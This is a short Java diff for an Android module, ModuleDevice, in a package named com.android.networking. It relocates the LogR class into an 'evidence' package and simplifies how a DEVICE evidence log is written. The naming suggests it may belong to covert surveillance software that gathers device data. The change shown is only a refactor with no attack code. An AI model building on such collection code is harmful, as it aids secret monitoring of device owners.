@@ -22,12 +22,12 @@ import android.content.pm.PackageManager;
 import android.os.Build;
 
 import com.android.networking.Device;
-import com.android.networking.LogR;
 import com.android.networking.Messages;
 import com.android.networking.Status;
 import com.android.networking.auto.Cfg;
 import com.android.networking.conf.ConfModule;
 import com.android.networking.evidence.EvidenceType;
+import com.android.networking.evidence.LogR;
 import com.android.networking.util.Check;
 import com.android.networking.util.WChar;
 
@@ -159,7 +159,7 @@ public class ModuleDevice extends BaseInstantModule {
 		// WChar.getBytes(content, true));
 
 		// log
-		final LogR log = new LogR(EvidenceType.DEVICE, LogR.LOG_PRI_STD);
+		final LogR log = new LogR(EvidenceType.DEVICE);
 		log.write(WChar.getBytes(content, true));
 		log.close();
 
